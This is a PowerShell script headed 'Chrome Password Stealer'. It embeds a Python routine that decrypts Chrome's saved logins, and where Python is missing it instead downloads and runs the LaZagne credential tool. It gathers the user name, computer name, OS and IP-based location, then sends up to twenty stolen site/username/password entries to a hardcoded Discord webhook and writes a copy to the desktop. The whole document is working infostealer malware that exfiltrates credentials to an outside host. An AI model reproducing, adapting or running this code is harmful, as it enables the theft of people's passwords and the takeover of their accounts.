# Chrome Password Stealer - Using Python Tool

$logFile = "$env:USERPROFILE\Desktop\extract_log.txt"

function Log {
    param($msg)
    $time = Get-Date -Format "HH:mm:ss"
    $line = "[$time] $msg"
    Add-Content $logFile $line
    Write-Host $line
}

"=== Password Extraction Started ===" | Out-File $logFile
Log "Script started"

try {
    # Download Python password stealer script
    Log "Downloading password extraction tool..."
    
    $pythonScript = @'
import os
import json
import base64
import sqlite3
import shutil
from datetime import datetime
from Crypto.Cipher import AES
import win32crypt

def get_chrome_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], 
                                     "AppData", "Local", "Google", "Chrome", 
                                     "User Data", "Local State")
    
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]
    
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def main():
    key = get_chrome_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    
    results = []
    for row in cursor.fetchall():
        url = row[0]
        username = row[1]
        encrypted_password = row[2]
        
        if username or encrypted_password:
            password = decrypt_password(encrypted_password, key)
            if password:
                results.append(f"{url}|{username}|{password}")
    
    cursor.close()
    db.close()
    os.remove(filename)
    
    # Write to temp file
    output_file = os.path.join(os.environ["TEMP"], "chrome_passwords.txt")
    with open(output_file, "w", encoding="utf-8") as f:
        f.write("\n".join(results))
    
    print(f"EXTRACTED:{len(results)}")

if __name__ == "__main__":
    main()
'@
    
    $scriptPath = "$env:TEMP\extract_chrome.py"
    $pythonScript | Out-File $scriptPath -Encoding UTF8
    
    Log "Python script created"
    
    # Check if Python is installed
    $pythonPath = $null
    $pythonCommands = @("python", "python3", "py")
    
    foreach ($cmd in $pythonCommands) {
        try {
            $version = & $cmd --version 2>&1
            if ($version -match "Python") {
                $pythonPath = $cmd
                Log "Found Python: $version"
                break
            }
        } catch {}
    }
    
    if (-not $pythonPath) {
        Log "Python not found - installing required modules via PowerShell method..."
        
        # Fallback: Use PowerShell with embedded Chrome stealer EXE
        Log "Downloading pre-compiled Chrome stealer..."
        
        $stealerUrl = "https://github.com/AlessandroZ/LaZagne/releases/latest/download/lazagne.exe"
        $stealerPath = "$env:TEMP\lz.exe"
        
        try {
            Invoke-WebRequest -Uri $stealerUrl -OutFile $stealerPath -UseBasicParsing
            Log "Downloaded LaZagne"
            
            # Run LaZagne to extract Chrome passwords
            $output = & $stealerPath browsers -oN -quiet
            
            Log "LaZagne output:"
            Log $output
            
            # Parse output
            $passwords = @()
            $lines = $output -split "`n"
            
            foreach ($line in $lines) {
                if ($line -match "URL:.*") {
                    $url = ($line -split "URL:")[1].Trim()
                }
                if ($line -match "Username:.*") {
                    $username = ($line -split "Username:")[1].Trim()
                }
                if ($line -match "Password:.*") {
                    $password = ($line -split "Password:")[1].Trim()
                    
                    if ($url -and $password) {
                        $passwords += @{
                            URL = $url
                            User = $username
                            Pass = $password
                        }
                    }
                }
            }
            
            Remove-Item $stealerPath -Force -ErrorAction SilentlyContinue
            
        } catch {
            Log "LaZagne failed: $($_.Exception.Message)"
        }
        
    } else {
        # Install required Python packages
        Log "Installing Python dependencies..."
        & $pythonPath -m pip install pycryptodome pywin32 --quiet --disable-pip-version-check
        
        Log "Running Python password extractor..."
        $output = & $pythonPath $scriptPath 2>&1
        
        Log "Python output: $output"
        
        # Read results
        $resultFile = "$env:TEMP\chrome_passwords.txt"
        
        if (Test-Path $resultFile) {
            $passwordData = Get-Content $resultFile -Raw
            $lines = $passwordData -split "`n"
            
            $passwords = @()
            foreach ($line in $lines) {
                if ($line) {
                    $parts = $line -split "\|"
                    if ($parts.Length -eq 3) {
                        $passwords += @{
                            URL = $parts[0]
                            User = $parts[1]
                            Pass = $parts[2]
                        }
                    }
                }
            }
            
            Remove-Item $resultFile -Force
            Log "Extracted $($passwords.Count) passwords!"
        }
    }
    
    Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
    
    # Get system info
    Log "Getting system info..."
    $user = $env:USERNAME
    $computer = $env:COMPUTERNAME
    $os = (Get-CimInstance Win32_OperatingSystem).Caption
    $time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    
    try {
        $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json/"
        $ip = $ipInfo.query
        $country = $ipInfo.country
        $city = $ipInfo.city
    } catch {
        $ip = "Unknown"
        $country = "Unknown"
        $city = "Unknown"
    }
    
    # Format for Discord
    $passText = ""
    $max = [Math]::Min($passwords.Count, 20)
    
    for ($i = 0; $i -lt $max; $i++) {
        $p = $passwords[$i]
        $passText += "`n**$($p.URL)**`nUser: ``$($p.User)```nPass: ``$($p.Pass)```n"
    }
    
    if ($passwords.Count -gt 20) {
        $passText += "`n... +$($passwords.Count - 20) more"
    }
    
    if (-not $passText) {
        $passText = "`nNo passwords extracted"
    }
    
    $message = @"
**🚨 New Connection**
:clock1: $time
:computer: $computer | $user
:desktop: $os
:globe_with_meridians: $ip - $city, $country

**🔐 Passwords ($($passwords.Count)):**$passText
"@
    
    # Send to Discord
    Log "Sending to Discord..."
    $webhookUrl = "https://discord.com/api/webhooks/1453475000702206156/Ca0qqkCYAAHYznCwmCLdGOKB3ebrQTWuwK2bklV31WJOqOOoHXtjgMIAykTVHl0gw6vP"
    
    if ($message.Length -gt 1900) {
        $message = $message.Substring(0, 1900)
    }
    
    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{content=$message}|ConvertTo-Json) -ContentType "application/json"
        Log "SUCCESS! Sent to Discord"
    } catch {
        Log "Discord send failed: $($_.Exception.Message)"
    }
    
    # Save locally
    $outFile = "$env:USERPROFILE\Desktop\passwords.txt"
    $passwords | Format-List | Out-File $outFile
    Log "Saved to: $outFile"
    
} catch {
    Log "FATAL ERROR: $($_.Exception.Message)"
}

Write-Host "`n=== Check Desktop for: extract_log.txt and passwords.txt ===" -ForegroundColor Cyan
Read-Host "Press Enter to close"
